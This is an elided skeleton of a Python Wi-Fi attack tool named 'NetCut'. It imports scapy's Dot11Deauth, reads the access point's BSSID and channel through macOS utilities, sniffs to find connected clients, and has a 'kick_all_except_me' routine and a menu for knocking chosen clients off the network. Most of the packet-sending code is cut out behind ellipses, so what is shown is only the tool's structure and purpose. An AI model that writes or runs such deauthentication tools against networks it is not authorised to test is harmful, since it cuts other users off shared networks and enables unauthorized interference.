...
from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11Beacon, Dot11ProbeResp, Dot11AssoReq, Dot11AssoResp
...
class NetCut:
    ...
    def get_network_info(self):
        ...
        result = subprocess.run(['sudo', 'wdutil', 'info'], capture_output=True, text=True)
        ...
        # Get my MAC
        ifconfig_result = subprocess.run(['ifconfig', self.interface], capture_output=True, text=True)
        ...
        if not all([self.ap_bssid, self.ap_channel, self.my_mac]):
            print("[!] Error: Could not get network information. Are you connected to WiFi?")
            return False
    ...
    def set_channel(self):
        ...
        subprocess.run(['sudo', airport_path, self.interface, f'--channel={self.ap_channel}'], 
                      capture_output=True)
    ...
    def packet_handler(self, pkt):
        ...
        if pkt.addr1 and pkt.addr1 != "ff:ff:ff:ff:ff:ff" and pkt.addr1 != self.ap_bssid and pkt.addr1 != self.my_mac:
            with self.lock:
        ...
        # Check addr2 (source)
        if pkt.addr2 and pkt.addr2 != "ff:ff:ff:ff:ff:ff" and pkt.addr2 != self.ap_bssid and pkt.addr2 != self.my_mac:
            with self.lock:
    ...
    def discover_clients(self, duration=30):
        ...
        self.running = True
        sniff(iface=self.interface, prn=self.packet_handler, timeout=duration, store=False)
        ...
        try:
            while time.time() - start_time < duration:
                ...
                if count % 20 == 0:
                    ...
                    print(f"[*] Sent {count} packets ({elapsed:.1f}s elapsed)...", end='\r')
    ...
    def kick_all_except_me(self, duration=60):
        ...
        try:
            while time.time() - start_time < duration:
                ...
                if count % 50 == 0:
                    elapsed = time.time() - start_time
                    print(f"[*] Sent {count} packets to {len(self.clients)} clients ({elapsed:.1f}s)...", end='\r')
    ...
    def interactive_menu(self):
        ...
        while True:
            ...
            if choice == "1":
                ...
                try:
                    idx = int(input(f"Enter client number (1-{len(client_list)}): ")) - 1
